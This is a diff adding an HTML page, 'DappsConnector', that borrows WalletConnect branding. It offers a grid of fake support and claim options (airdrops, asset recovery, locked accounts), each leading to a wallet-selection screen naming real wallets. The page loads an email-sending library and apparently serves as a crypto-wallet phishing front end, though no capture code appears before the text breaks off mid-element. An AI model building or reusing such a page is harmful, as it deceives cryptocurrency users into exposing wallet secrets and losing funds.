@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DappsConnector</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #e8eaf6 0%, #c8e6c9 50%, #f3e5f5 100%);
+        }
+        .card-hover:hover {
+            transform: translateY(-2px);
+            transition: all 0.3s ease;
+        }
+        .loading-bar {
+            width: 0%;
+            transition: width 2s ease-in-out;
+        }
+        .loading-bar.active {
+            width: 100%;
+        }
+        .floating-shapes {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 400px;
+            height: 400px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 400"><defs><linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%234f46e5;stop-opacity:0.8" /><stop offset="100%" style="stop-color:%2306b6d4;stop-opacity:0.6" /></linearGradient></defs><rect x="50" y="50" width="80" height="80" rx="10" fill="%2300c851" transform="rotate(15 90 90)"/><circle cx="200" cy="100" r="30" fill="%236366f1"/><rect x="150" y="180" width="60" height="60" rx="30" fill="%23ec4899"/><circle cx="300" cy="200" r="25" fill="%2310b981"/><rect x="80" y="250" width="40" height="40" rx="20" fill="%23f59e0b"/><circle cx="250" cy="300" r="35" fill="%238b5cf6"/></svg>') no-repeat;
+            background-size: contain;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body class="min-h-screen">
+
+    <!-- Page 1: Landing Page with Issues -->
+    <div id="page1" class="min-h-screen gradient-bg relative overflow-hidden">
+        <!-- Floating shapes background -->
+        <div class="floating-shapes"></div>
+        
+        <div class="relative z-10 p-4 max-w-7xl mx-auto">
+            <!-- Header -->
+            <div class="flex items-center justify-between pt-6 mb-12">
+                <div class="flex items-center space-x-2">
+                    <div class="w-8 h-8 bg-blue-500 rounded flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M13 6a3 3 0 11-6 0 3 3 0 016 0zM18 8a2 2 0 11-4 0 2 2 0 014 0zM14 15a4 4 0 00-8 0v3h8v-3z"/>
+                        </svg>
+                    </div>
+                    <span class="text-blue-700 font-medium text-sm">WalletConnect</span>
+                </div>
+            </div>
+
+            <div class="flex flex-col lg:flex-row items-center justify-between">
+                <!-- Left content -->
+                <div class="lg:w-1/2 mb-12 lg:mb-0">
+                    <h1 class="text-5xl lg:text-6xl font-bold text-gray-800 mb-6 leading-tight">
+                        DappsConnector
+                    </h1>
+                    <p class="text-gray-600 text-lg mb-8 max-w-md leading-relaxed">
+                        Open protocol to communicate securely between Wallets and Dapps (Web3 Apps). The protocol establishes a remote connection using a Bridge server.
+                    </p>
+                    <button onclick="showWalletSelection()" class="bg-blue-500 hover:bg-blue-600 text-white px-8 py-4 rounded-lg font-medium text-lg transition-all duration-300 shadow-lg hover:shadow-xl">
+                        Connect →
+                    </button>
+                </div>
+
+                <!-- Right floating elements -->
+                <div class="lg:w-1/2 relative">
+                    <div class="w-full h-96 relative">
+                        <!-- Main container -->
+                        <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
+                            <div class="w-32 h-32 bg-blue-500 rounded-2xl transform rotate-12 shadow-xl"></div>
+                        </div>
+                        <!-- Additional floating elements -->
+                        <div class="absolute top-0 right-0 w-16 h-16 bg-purple-500 rounded-lg transform -rotate-12"></div>
+                        <div class="absolute bottom-0 left-0 w-20 h-20 bg-green-400 rounded-xl transform rotate-45"></div>
+                        <div class="absolute top-1/4 left-0 w-12 h-12 bg-yellow-400 rounded-full"></div>
+                        <div class="absolute bottom-1/4 right-0 w-14 h-14 bg-pink-400 rounded-lg transform rotate-30"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Issues Grid -->
+            <div class="mt-16 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                <!-- Row 1 -->
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">Buy Presale</h3>
+                    <p class="text-gray-300 text-sm">Click here to get your token presale</p>
+                </div>
+                
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">Claim Tokens</h3>
+                    <p class="text-gray-300 text-sm">Click here to claim your tokens</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M7.707 3.293a1 1 0 010 1.414L5.414 7H11a7 7 0 017 7v2a1 1 0 11-2 0v-2A5 5 0 0011 9H5.414l2.293 2.293a1 1 0 11-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">Migration Issues</h3>
+                    <p class="text-gray-300 text-sm">Click here for migration related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">Assets Recovery</h3>
+                    <p class="text-gray-300 text-sm">Click here for assets recovery issues</p>
+                </div>
+
+                <!-- Row 2 -->
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">General Issues</h3>
+                    <p class="text-gray-300 text-sm">Click here for general related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">Rectification</h3>
+                    <p class="text-gray-300 text-sm">Click here to rectify issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z"/>
+                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">High Gas Fees</h3>
+                    <p class="text-gray-300 text-sm">Click here for gas fee related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M3 3a1 1 0 000 2v8a2 2 0 002 2h2.586l-1.293 1.293a1 1 0 101.414 1.414L10 15.414l2.293 2.293a1 1 0 001.414-1.414L12.414 15H15a2 2 0 002-2V5a1 1 0 100-2H3zm11.707 4.707a1 1 0 00-1.414-1.414L10 9.586 8.707 8.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-lg mb-2">Claim Reward</h3>
+                    <p class="text-gray-300 text-sm">Click here for reward related issues</p>
+                </div>
+
+                <!-- Continue with more rows for all the issues shown in the image -->
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Deposits & Withdrawals</h3>
+                    <p class="text-gray-300 text-sm">Click here for withdrawal related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Slippage Error</h3>
+                    <p class="text-gray-300 text-sm">Click here for slippage related error issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Transaction Error</h3>
+                    <p class="text-gray-300 text-sm">Click here for transaction related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Staking Issues</h3>
+                    <p class="text-gray-300 text-sm">Click here for staking related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Swap/Exchange</h3>
+                    <p class="text-gray-300 text-sm">Click here for swap/exchange related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Connect to Dapps</h3>
+                    <p class="text-gray-300 text-sm">Click here for error while connecting to Dapps</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Transaction Delay</h3>
+                    <p class="text-gray-300 text-sm">To trade crypto your account need be mined in a limited payment source</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Trading Wallet Issues</h3>
+                    <p class="text-gray-300 text-sm">Click here if you have problem with your trading wallet</p>
+                </div>
+
+                <!-- Add more rows as needed to match all issues from the image -->
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Locked Account</h3>
+                    <p class="text-gray-300 text-sm">Click here for issues related to account lock. We would resolve the issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Claim Airdrop</h3>
+                    <p class="text-gray-300 text-sm">Click here for airdrop related issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Cross Chain Transactions</h3>
+                    <p class="text-gray-300 text-sm">Click here for cross chain bridge issues</p>
+                </div>
+
+                <div class="bg-gray-600 bg-opacity-90 p-6 rounded-xl card-hover cursor-pointer text-white" onclick="showWalletSelection()">
+                    <div class="w-10 h-10 bg-blue-500 rounded-lg mb-4"></div>
+                    <h3 class="font-semibold text-lg mb-2">Login Issues</h3>
+                    <p class="text-gray-300 text-sm">Click here for issues while logging into your wallet</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 2: Wallet Selection -->
+    <div id="page2" class="hidden min-h-screen bg-gray-900 text-white p-4">
+        <div class="max-w-6xl mx-auto">
+            <!-- Header -->
+            <div class="flex justify-between items-center mb-8 pt-4">
+                <h1 class="text-xl font-semibold">DappsConnector</h1>
+                <div class="flex items-center space-x-2">
+                    <span class="text-sm">🔍</span>
+                    <button class="bg-blue-600 text-white px-4 py-2 rounded-lg text-sm font-medium">
+                        Validate Wallet
+                    </button>
+                </div>
+            </div>
+
+            <h2 class="text-3xl font-bold text-center mb-12">Select a Wallet</h2>
+
+            <!-- Wallets Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+                <!-- Original wallets -->
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Metamask', 'metamask.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-orange-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">M</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Metamask</h3>
+                            <p class="text-gray-400 text-sm">metamask.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Trust Wallet', 'trustwallet.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-blue-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">T</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Trust Wallet</h3>
+                            <p class="text-gray-400 text-sm">trustwallet.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Coinbase', 'coinbase.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">C</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Coinbase</h3>
+                            <p class="text-gray-400 text-sm">coinbase.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Phantom', 'phantom.app')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-purple-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">P</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Phantom</h3>
+                            <p class="text-gray-400 text-sm">phantom.app</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Solflare', 'solflare.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-yellow-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">S</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Solflare</h3>
+                            <p class="text-gray-400 text-sm">solflare.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Best Wallet', 'bestwallet.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-indigo-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">B</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Best Wallet</h3>
+                            <p class="text-gray-400 text-sm">bestwallet.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Safepal', 'safepal.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-gray-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">S</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Safepal</h3>
+                            <p class="text-gray-400 text-sm">safepal.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('WalletConnect', 'walletconnect.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-blue-400 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">W</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">WalletConnect</h3>
+                            <p class="text-gray-400 text-sm">walletconnect.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Binance Chain Wallet', 'binance.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-yellow-400 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">B</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Binance Chain Wallet</h3>
+                            <p class="text-gray-400 text-sm">binance.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Polygon Wallet', 'polygon.technology')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-purple-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">P</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Polygon Wallet</h3>
+                            <p class="text-gray-400 text-sm">polygon.technology</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Rainbow', 'rainbow.me')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-gradient-to-r from-red-500 to-blue-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">R</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Rainbow</h3>
+                            <p class="text-gray-400 text-sm">rainbow.me</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Bitpay', 'bitpay.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-blue-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">B</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Bitpay</h3>
+                            <p class="text-gray-400 text-sm">bitpay.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Walleth', 'walleth.org')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-gray-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">W</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Walleth</h3>
+                            <p class="text-gray-400 text-sm">walleth.org</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Argent', 'argent.xyz')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-orange-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">A</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Argent</h3>
+                            <p class="text-gray-400 text-sm">argent.xyz</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Huobi Wallet', 'huobiwallet.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-blue-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">H</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Huobi Wallet</h3>
+                            <p class="text-gray-400 text-sm">huobiwallet.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Encrypted Ink', 'encrypted.ink')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-red-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">E</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Encrypted Ink</h3>
+                            <p class="text-gray-400 text-sm">encrypted.ink</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Compound', 'compound.finance')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-green-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">C</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Compound</h3>
+                            <p class="text-gray-400 text-sm">compound.finance</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Additional Wallets -->
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Polkadot', 'polkadot.network')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-pink-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">P</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Polkadot</h3>
+                            <p class="text-gray-400 text-sm">polkadot.network</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Iotex', 'iotex.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-teal-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">I</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Iotex</h3>
+                            <p class="text-gray-400 text-sm">iotex.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Coin98', 'coin98.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-yellow-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">C</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Coin98</h3>
+                            <p class="text-gray-400 text-sm">coin98.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Crypto.com DeFi Wallet', 'crypto.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-blue-800 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">C</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Crypto.com DeFi Wallet</h3>
+                            <p class="text-gray-400 text-sm">crypto.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Token Pocket', 'tokenpocket.pro')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-cyan-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">T</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Token Pocket</h3>
+                            <p class="text-gray-400 text-sm">tokenpocket.pro</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Math Wallet', 'mathwallet.org')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-indigo-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">M</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Math Wallet</h3>
+                            <p class="text-gray-400 text-sm">mathwallet.org</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Ledger Live', 'ledger.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-green-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">L</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Ledger Live</h3>
+                            <p class="text-gray-400 text-sm">ledger.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('1inch', '1inch.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-red-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">1</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">1inch</h3>
+                            <p class="text-gray-400 text-sm">1inch.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Dharma', 'dharma.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-emerald-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">D</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Dharma</h3>
+                            <p class="text-gray-400 text-sm">dharma.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Trust Vault', 'trustology.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-slate-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">T</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Trust Vault</h3>
+                            <p class="text-gray-400 text-sm">trustology.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Nova Wallet', 'novawallet.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-violet-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">N</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Nova Wallet</h3>
+                            <p class="text-gray-400 text-sm">novawallet.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Fearless Wallet', 'fearlesswallet.io')">
+                    <div class="flex items-center space-x-3">
